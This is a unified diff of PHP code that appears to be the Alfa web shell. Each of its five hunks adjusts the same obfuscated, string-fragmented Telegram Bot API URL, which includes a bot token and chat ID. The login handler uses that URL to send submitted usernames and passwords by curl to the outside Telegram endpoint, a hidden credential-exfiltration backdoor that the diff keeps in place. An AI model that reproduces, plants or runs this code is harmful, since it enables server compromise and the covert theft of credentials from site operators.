@@ -612,7 +612,7 @@ if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config[
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
-$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZB'.'WQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZ'.'BWQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
 $alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
 $ch = curl_init();
@@ -651,7 +651,7 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
-$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZB'.'WQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZ'.'BWQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
 $alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
 $ch = curl_init();
@@ -671,7 +671,7 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
-$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZB'.'WQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZ'.'BWQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
 $alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
 $ch = curl_init();
@@ -691,7 +691,7 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
-$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZB'.'WQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZ'.'BWQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
 $alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
 $ch = curl_init();
@@ -711,7 +711,7 @@ if(@md5($_POST["password"])==$config['AlfaPass']){
 __alfa_set_cookie("AlfaUser", $config['AlfaUser']);
 __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
-$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZB'.'WQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
+$alfaendpoint = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot8220859'.'290:'.'AAGZ'.'BWQRwB'.'YN8mk'.'L6sMa'.'SOQcb'.'xPz6R'.'ED31M/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $alfaendpointdata = 'ALFA DATA %0A'.$_POST["usrname"].'%0A'.$_POST["password"];
 $alfaurl = rawurldecode($alfaendpoint.$alfaendpointdata);
 $ch = curl_init();
